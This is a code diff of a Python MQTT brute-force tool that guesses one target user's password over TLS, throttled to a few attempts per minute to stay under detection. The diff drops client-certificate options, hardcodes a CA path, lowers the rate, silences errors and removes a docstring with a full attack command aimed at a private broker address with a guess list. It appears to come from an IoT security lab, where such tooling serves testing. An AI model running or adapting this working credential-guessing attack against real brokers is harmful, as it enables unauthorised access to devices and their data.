@@ -1,12 +1,4 @@
 #!/usr/bin/env python3
-"""
-MQTT Single User Slow Brute-force Password Cracking (TLS Support)
-=================================================================
-Slow brute-force password cracking for individual usernames.
-python .\attack_tls\slow_brute_force.py --broker 10.12.112.191 --port 8883 --target-username production-sensorflame1-replayer --ca .\certs\ca-cert.pem --tls --custom-passwords "123456" "password" "admin" "1234" "0000" "1111" "8888" "12345" "12345678" "123456789" "sensor123" "production123"  "sensor" "flamel" "production" "replayer" "sensorflamel"  --min-length 7 --max-length 8 --packets-per-minute 4
-Rate limited to 40 packets per minute.
-"""
-
 import paho.mqtt.client as mqtt
 import time
 import threading
@@ -21,14 +13,11 @@ import math
 
 class SingleUserSlowBruteForceAttack:
     def __init__(self, broker_host="localhost", broker_port=1883, 
-                 use_tls=False, ca_certs=None, client_cert=None, 
-                 client_key=None, insecure=False):
+                 use_tls=False, ca_certs="certs/ca-cert.pem", insecure=False):
         self.broker_host = broker_host
         self.broker_port = broker_port
         self.use_tls = use_tls
         self.ca_certs = ca_certs
-        self.client_cert = client_cert
-        self.client_key = client_key
         self.insecure = insecure
         self.cracked_password = None
         self.attack_stats = {
@@ -38,23 +27,20 @@ class SingleUserSlowBruteForceAttack:
             "connections_failed": 0,
             "start_time": None,
             "end_time": None,
-            "packets_per_minute": 40
+            "packets_per_minute": 4
         }
         self.lock = threading.Lock()
         self.last_attempt_time = 0
-        self.min_interval = 60.0 / 40  # 1.5 seconds between attempts
+        self.min_interval = 60.0 / 4  # 1.5 seconds between attempts
         
     def _print_cert_status(self):
         """Print TLS certificate configuration status"""
         if self.use_tls:
             print(f"  TLS Enabled: Yes")
             if self.ca_certs:
-                print(f"  Using CA file: {self.ca_certs} -> {'FOUND' if os.path.exists(self.ca_certs) else 'MISSING'}")
+                print(f"  Using CA file (Hardcoded/Default): {self.ca_certs} -> {'FOUND' if os.path.exists(self.ca_certs) else 'MISSING'}")
             else:
                 print("  No CA file provided; will use system CA store (if available).")
-            if self.client_cert or self.client_key:
-                print(f"  Client cert: {self.client_cert} -> {'FOUND' if (self.client_cert and os.path.exists(self.client_cert)) else 'MISSING or not provided'}")
-                print(f"  Client key : {self.client_key} -> {'FOUND' if (self.client_key and os.path.exists(self.client_key)) else 'MISSING or not provided'}")
             print(f"  Insecure mode (skip verification): {self.insecure}")
         else:
             print(f"  TLS Enabled: No")
@@ -65,17 +51,14 @@ class SingleUserSlowBruteForceAttack:
             client = mqtt.Client(client_id=client_id, callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
             
             if self.use_tls:
+                
                 if self.ca_certs and os.path.exists(self.ca_certs):
                     client.tls_set(ca_certs=self.ca_certs,
-                                   certfile=self.client_cert if self.client_cert and os.path.exists(self.client_cert) else None,
-                                   keyfile=self.client_key if self.client_key and os.path.exists(self.client_key) else None,
                                    cert_reqs=ssl.CERT_REQUIRED,
                                    tls_version=ssl.PROTOCOL_TLS_CLIENT,
                                    ciphers=None)
                 else:
                     ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
-                    if self.client_cert and self.client_key and os.path.exists(self.client_cert) and os.path.exists(self.client_key):
-                        ctx.load_cert_chain(certfile=self.client_cert, keyfile=self.client_key)
                     if self.insecure:
                         ctx.check_hostname = False
                         ctx.verify_mode = ssl.CERT_NONE
@@ -92,11 +75,11 @@ class SingleUserSlowBruteForceAttack:
             
             return client
         except Exception as e:
-            print(f" Error creating client {client_id}: {e}")
+            # print(f" Error creating client {client_id}: {e}")
             return None
     
     def enforce_rate_limit(self):
-        """Enforce rate limit of 40 packets per minute"""
+        """Enforce rate limit of N packets per minute"""
         current_time = time.time()
         time_since_last_attempt = current_time - self.last_attempt_time
         
@@ -221,7 +204,7 @@ class SingleUserSlowBruteForceAttack:
                 
                 connection_result = {"success": False, "rc": None}
                 
-                def on_connect(client, userdata, flags, rc, properties):
+                def on_connect(client, userdata, flags, rc, properties=None):
                     connection_result["rc"] = rc
                     if rc == 0:
                         connection_result["success"] = True
@@ -274,7 +257,7 @@ class SingleUserSlowBruteForceAttack:
                         return False
                 
             except Exception as e:
-                print(f" Error with password {password}: {e}")
+                # print(f" Error with password {password}: {e}")
                 with self.lock:
                     self.attack_stats["failed_logins"] += 1
                 continue
@@ -283,13 +266,13 @@ class SingleUserSlowBruteForceAttack:
         return False
     
     def launch_attack(self, username, min_password_length=4, max_password_length=6, 
-                     custom_passwords=None, password_file=None, packets_per_minute=40):
+                     custom_passwords=None, password_file=None, packets_per_minute=4):
         """Launch slow brute-force password cracking attack for a single username"""
         # Update rate limit based on parameter
         self.attack_stats["packets_per_minute"] = packets_per_minute
         self.min_interval = 60.0 / packets_per_minute
         
-        print(f"🚀 Starting SLOW Brute-force Attack for Single User")
+        print(f"🚀 Starting SLOW Brute-force Attack for Single User (CA Hardcoded)")
         print(f"   Target: {self.broker_host}:{self.broker_port}")
         print(f"   Username: {username}")
         print(f"   Rate limit: {packets_per_minute} packets/minute")
@@ -348,7 +331,7 @@ class SingleUserSlowBruteForceAttack:
         
         if success and self.cracked_password:
             print(f"\n🎯 CRACKED: {username}:{self.cracked_password}")
-            print("=" * 40)
+            print("=" * 4)
         else:
             print(f"\n❌ FAILED: Password not found for {username}")
         
@@ -363,7 +346,7 @@ class SingleUserSlowBruteForceAttack:
             print(f"Target attempts per minute: {self.attack_stats['packets_per_minute']}")
 
 def main():
-    parser = argparse.ArgumentParser(description="MQTT Single User Slow Brute-force Password Cracking")
+    parser = argparse.ArgumentParser(description="MQTT Single User Slow Brute-force (CA Hardcoded)")
     
     parser.add_argument("--broker", required=True, help="MQTT broker host (required)")
     parser.add_argument("--target-username", required=True, help="Target username to crack (required)")
@@ -371,12 +354,11 @@ def main():
     parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
     parser.add_argument("--min-length", type=int, default=4, help="Minimum password length")
     parser.add_argument("--max-length", type=int, default=6, help="Maximum password length")
-    parser.add_argument("--packets-per-minute", type=int, default=40, 
-                       help="Rate limit: packets per minute (default: 40)")
+    parser.add_argument("--packets-per-minute", type=int, default=4, 
+                       help="Rate limit: packets per minute (default: 4)")
     parser.add_argument("--tls", action="store_true", help="Use TLS connection")
-    parser.add_argument("--ca", help="Path to CA certificate file (PEM) to validate broker certificate")
-    parser.add_argument("--client-cert", help="Path to client certificate (PEM) for mutual TLS")
-    parser.add_argument("--client-key", help="Path to client private key (PEM) for mutual TLS")
+    
+    parser.add_argument("--ca", default="certs/ca-cert.pem", help="Path to CA certificate file (Default: certs/ca-cert.pem)")
     parser.add_argument("--insecure", action="store_true", help="Skip TLS certificate validation (testing only)")
     parser.add_argument("--password-file", help="File containing passwords to try (one per line)")
     parser.add_argument("--custom-passwords", nargs="+", help="Custom passwords to try")
@@ -388,8 +370,6 @@ def main():
         broker_port=args.port,
         use_tls=args.tls,
         ca_certs=args.ca,
-        client_cert=args.client_cert,
-        client_key=args.client_key,
         insecure=args.insecure
     )
     
